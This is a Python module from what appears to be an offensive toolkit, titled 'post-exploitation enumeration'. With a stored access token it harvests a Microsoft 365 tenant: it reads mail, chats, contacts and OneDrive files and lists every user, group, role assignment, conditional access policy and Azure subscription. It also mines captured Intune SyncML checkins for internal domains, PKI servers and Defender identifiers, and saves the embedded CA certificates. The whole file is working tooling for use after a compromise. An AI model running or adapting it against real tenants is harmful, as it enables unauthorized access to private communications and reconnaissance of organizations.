"""Module 9: Post-exploitation enumeration.

Takes a stored/imported token and enumerates what it can reach. Dispatches by the token's
audience: Graph, Exchange, SharePoint, or Azure Management.

Also parses SyncML/OMA-DM checkin captures for corporate intel: on-prem +
cloud CA certs, internal AD domain, internal PKI URL/server, Defender/MDE config, Intune
account ID, and WHfB/Biometrics policy. This is data extraction, not directory enumeration.
"""
import base64
import os
import re

import requests

from lib.logger import logged_session, get as get_log
from lib.util import decode_jwt

GRAPH_ENDPOINTS = [
    ("/v1.0/me", "Profile"),
    ("/v1.0/me/messages?$top=50&$select=subject,from,receivedDateTime", "Emails"),
    ("/v1.0/me/drive/root/children?$top=50", "OneDrive"),
    ("/v1.0/me/memberOf", "Group Memberships"),
    ("/v1.0/me/contacts?$top=50", "Contacts"),
    ("/v1.0/me/calendar/events?$top=20", "Calendar"),
    ("/v1.0/me/joinedTeams", "Teams"),
    ("/v1.0/me/chats?$top=10", "Chats"),
    ("/v1.0/organization", "Organization"),
    ("/v1.0/users?$top=999", "All Users"),
    ("/v1.0/groups?$top=999", "All Groups"),
    ("/v1.0/domains", "Domains"),
    ("/v1.0/applications?$top=100", "Applications"),
    ("/v1.0/servicePrincipals?$top=100", "Service Principals"),
    ("/v1.0/identity/conditionalAccess/policies", "CA Policies (admin only)"),
    ("/v1.0/directoryRoles", "Directory Roles"),
    ("/v1.0/roleManagement/directory/roleAssignments", "Role Assignments"),
    ("/v1.0/sites?search=*", "SharePoint Sites"),
    # Reporting endpoints (admin: auth methods, usage, activity)
    ("/v1.0/reports/authenticationMethods/userRegistrationDetails", "Auth Method Registration"),
    ("/v1.0/reports/getEmailActivityUserDetail(period='D30')", "Email Activity (30d)"),
    ("/v1.0/reports/getMailboxUsageDetail(period='D30')", "Mailbox Usage (30d)"),
    ("/v1.0/reports/getTeamsUserActivityUserDetail(period='D30')", "Teams Activity (30d)"),
    ("/v1.0/reports/getOneDriveUsageAccountDetail(period='D30')", "OneDrive Usage (30d)"),
    ("/v1.0/reports/credentialUserRegistrationDetails", "Credential Registration"),
]


def run(cfg, eng, args):
    log = get_log()
    tok = eng.load_token(args.token)
    if not tok:
        raise SystemExit(f"[enum] Token '{args.token}' not found in {eng.tokens}")
    at = tok.get("access_token")
    if not at:
        raise SystemExit("[enum] Stored token has no access_token.")

    claims = decode_jwt(at)
    aud = (claims.get("aud") or "").lower()
    log.info(f"[enum] === Enumeration with token '{args.token}' ===")
    log.info(f"[enum]   Audience: {aud}")
    log.info(f"[enum]   UPN:      {claims.get('upn', 'N/A')}")
    log.info(f"[enum]   Scopes:   {claims.get('scp', 'N/A')}")
    log.info(f"[enum]   Expires:  {claims.get('exp', 'N/A')}")

    if "graph.microsoft.com" in aud or aud in ("00000003-0000-0000-c000-000000000000",):
        results = _graph(at)
    elif "outlook" in aud or "office365" in aud:
        results = _exchange(at)
    elif "sharepoint" in aud:
        results = _sharepoint(at, cfg)
    elif "management.azure.com" in aud or "management.core" in aud:
        results = _azure_mgmt(at)
    else:
        print(f"[enum] No specialized enumerator for aud={aud}; trying Graph.")
        results = _graph(at)

    out = eng.save_json("evidence", f"enum_{args.token}", results)
    print(f"[enum] Saved -> {out}")
    return results


def run_syncml_intel(cfg, eng, args):
    """Parse a pytune SyncML checkin capture for corporate intel + extract embedded CA certs."""
    path = args.file
    if not os.path.exists(path):
        raise SystemExit(f"[syncml] Capture not found: {path}")
    with open(path, encoding="utf-8", errors="replace") as f:
        text = f.read()
    intel = syncml_intel(text, eng)
    out = eng.save_json("evidence", "syncml_intel", intel)
    print("[syncml] === Corporate intel extracted ===")
    for k, v in intel.items():
        if k == "certificates":
            print(f"  certificates: {len(v)} extracted -> {eng.certs}")
            for c in v:
                print(f"    - {c['subject']} (thumb {c['thumbprint'][:16]}...)")
        elif v:
            print(f"  {k}: {v}")
    print(f"[syncml] -> {out}")
    return intel


def syncml_intel(text, eng=None):
    """Regex-extract intel from SyncML checkin text. Returns a dict; extracts certs if eng given."""
    def first(pat):
        m = re.search(pat, text, re.IGNORECASE)
        return m.group(1) if m else None

    intel = {
        "internal_domain": first(r"\b([A-Z0-9\-]+\.[A-Z0-9\-]+\.INTERNAL)\b")
                           or _dc_domain(text),
        "pki_url": first(r"(https?://pki[\w\.\-/]+)"),
        "pki_server": first(r"\b(AE[A-Z0-9]{6,})\b"),
        "mde_org_id": first(r"[\"']?orgId[\"']?\s*[:=]\s*[\"']?([0-9a-f\-]{36})"),
        "mde_edr_endpoint": first(r"(edr-[\w\.\-]+\.endpoint\.security\.microsoft\.com)"),
        "mde_datacenter": first(r"\b(Ae[A-Za-z]+0[a-z])\b"),
        "intune_account_id": first(r"(?:AccountID|Intune Account ID)[\"'\s:=]+([0-9a-f\-]{36})"),
        "passport_for_work": "disabled" if re.search(r"PassportForWork.{0,40}(disabled|0)", text, re.I) else None,
        "biometrics": "enabled" if re.search(r"Biometrics.{0,40}(enabled|1)", text, re.I) else None,
        "wns_configured": bool(re.search(r"\bWNS\b|notify\.windows\.com", text, re.I)),
    }
    intel["certificates"] = _extract_certs(text, eng) if eng else _list_cert_subjects(text)
    return {k: v for k, v in intel.items() if v}


def _dc_domain(text):
    dcs = re.findall(r"DC=([A-Za-z0-9\-]+)", text)
    return ".".join(dcs).upper() if dcs else None


def _cert_blocks(text):
    # PEM blocks or raw base64 DER cert bodies (MII...).
    pem = re.findall(r"-----BEGIN CERTIFICATE-----(.+?)-----END CERTIFICATE-----", text, re.DOTALL)
    raw = re.findall(r"\b(MII[A-Za-z0-9+/=\s]{200,})", text)
    return [re.sub(r"\s+", "", b) for b in pem + raw]


def _list_cert_subjects(text):
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    out = []
    for b in _cert_blocks(text):
        try:
            cert = x509.load_der_x509_certificate(base64.b64decode(b), default_backend())
            out.append({"subject": cert.subject.rfc4514_string(),
                        "thumbprint": cert.fingerprint(__import__(
                            "cryptography.hazmat.primitives.hashes", fromlist=["SHA1"]).SHA1()).hex().upper()})
        except Exception:
            continue
    return out


def _extract_certs(text, eng):
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.serialization import Encoding
    out = []
    for b in _cert_blocks(text):
        try:
            der = base64.b64decode(b)
            cert = x509.load_der_x509_certificate(der, default_backend())
        except Exception:
            continue
        subj = cert.subject.rfc4514_string()
        thumb = cert.fingerprint(__import__("cryptography.hazmat.primitives.hashes",
                                            fromlist=["SHA1"]).SHA1()).hex().upper()
        cn = (subj.split("CN=")[-1].split(",")[0] if "CN=" in subj else thumb[:12])
        safe = re.sub(r"[^\w\-]", "_", cn)
        p = os.path.join(eng.certs, f"{safe}.crt")
        with open(p, "wb") as f:
            f.write(cert.public_bytes(Encoding.PEM))
        out.append({"subject": subj, "thumbprint": thumb, "path": p})
    return out


_enum_session = None

def _get(url, at, accept="application/json"):
    global _enum_session
    if _enum_session is None:
        _enum_session = logged_session("enum")
    try:
        r = _enum_session.get(url, headers={"Authorization": f"Bearer {at}", "Accept": accept}, timeout=30)
        body = r.json() if "json" in r.headers.get("content-type", "") else {"raw": r.text[:300]}
        return r.status_code, body
    except requests.RequestException as e:
        return 0, {"error": str(e)}


def _graph(at):
    results = {}
    for endpoint, name in GRAPH_ENDPOINTS:
        status, body = _get(f"https://graph.microsoft.com{endpoint}", at)
        count = len(body["value"]) if isinstance(body, dict) and "value" in body else None
        print(f"  {name}: {status}" + (f" ({count} items)" if count is not None else ""))
        results[name] = {"status": status, "count": count, "data": body if status == 200 else None}
    return results


def _exchange(at):
    results = {}
    for ep, name in [("/api/v2.0/me", "Mailbox owner"),
                     ("/api/v2.0/me/messages?$top=25", "Messages"),
                     ("/api/v2.0/me/mailfolders", "Mail folders")]:
        status, body = _get(f"https://outlook.office365.com{ep}", at)
        print(f"  {name}: {status}")
        results[name] = {"status": status, "data": body if status == 200 else None}
    return results


def _sharepoint(at, cfg):
    host = cfg.sharepoint_host
    results = {}
    for ep, name in [("/_api/web", "Web"),
                     ("/_api/web/lists?$top=50", "Lists"),
                     ("/_api/web/siteusers?$top=50", "Site users")]:
        status, body = _get(f"https://{host}{ep}", at)
        print(f"  {name}: {status}")
        results[name] = {"status": status, "data": body if status == 200 else None}
    return results


def _azure_mgmt(at):
    results = {}
    status, subs = _get("https://management.azure.com/subscriptions?api-version=2022-12-01", at)
    print(f"  Subscriptions: {status}")
    results["subscriptions"] = {"status": status, "data": subs}
    for sub in (subs.get("value") or []) if isinstance(subs, dict) else []:
        sid = sub.get("subscriptionId")
        s2, rgs = _get(f"https://management.azure.com/subscriptions/{sid}/resourcegroups?api-version=2021-04-01", at)
        print(f"    RGs in {sid}: {s2}")
        results[f"rgs_{sid}"] = {"status": s2, "data": rgs}
    return results
